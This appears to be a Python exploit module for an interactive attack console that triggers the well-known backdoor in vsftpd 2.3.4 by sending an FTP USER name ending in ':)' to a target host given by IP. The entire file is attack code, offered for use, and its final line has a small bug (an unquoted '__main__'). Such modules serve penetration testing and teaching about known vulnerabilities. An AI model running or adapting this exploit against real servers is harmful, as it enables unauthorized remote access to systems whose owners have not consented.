import os, sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
import core
class vsftpdBackdoorMenu(core.Exploit):
    def generate(self, p):
        p += self.rand_text(7)
        p += ":)"
        return p
    def deliver(self, p):
        self.init_deliver()
        s = self.connect()
        s.send("USER " + p)
        s.recv(1024)
        self.disconnect(s)
def main():
  menu = vsftpdBackdoorMenu("vsftpd_backdoor", "Linux with vsftpd v2.3.4", "", {"host":""}, {"host":"the IP of the target"})
  menu.cmdloop("pdf-console attack(vsftpd_backdoor)% ")
if __name__ == __main__:
  main()
